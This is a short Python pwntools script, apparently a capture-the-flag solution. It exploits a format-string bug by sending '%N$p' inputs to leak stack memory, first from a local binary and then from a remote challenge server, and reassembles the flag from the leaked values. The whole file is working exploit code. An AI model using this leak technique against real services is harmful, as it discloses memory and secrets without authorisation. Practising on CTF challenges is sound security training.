from pwn import *

def exploit(binary):
    flag = b''
    flag_started = False
    #I might break this off into its own function later.
    i = 1
    while True:
        
        p = process(binary)

        p.sendline('%'+str(i)+'$p')
        #Because I'm using %p's, I'll either get hex starting with '0x' or '(nil)'. The try statement is used to prevent it from crashing if I hit nil.
        try:
            p.recvuntil(b'0x', timeout=1)
            leak = p.recvline()

            chunk = p64(int(leak, 16))
            #The main point of this is to get the starting index of the flag and get a few fewer connections to the remote server and save some time, especially if it's running slowly.
            
            if b'flag' in chunk:
                flag_started = True
                flag_starting_index = i
            if flag_started == True:
                flag += p64(int(leak, 16))

            if b'}' in chunk:
                break
        except:
            pass
        i += 1        
        p.close()
    end = flag.find(b'}')
    flag = flag[:end+1]
    #print('The local flag is', flag.decode('ascii'))
    
    i = flag_starting_index
    flag = b''
    while True:
        url = f'ace-service-{binary}.chals.io'
        p = remote(url, 443, ssl=True, sni=url)

        p.sendline('%'+str(i)+'$p')
        try:
            p.recvuntil(b'0x', timeout=1)
            leak = p.recvline()

            chunk = p64(int(leak, 16))

            if b'flag' in chunk:
                flag_started = True
                flag_starting_index = i
            if flag_started == True:
                flag += p64(int(leak, 16))

            if b'}' in chunk:
                break
        except:
            pass
        i += 1        
        p.close()
    end = flag.find(b'}')
    flag = flag[:end+1]
    print('The remote flag that should be submitted as the answer is:', flag.decode('ascii'))
    return flag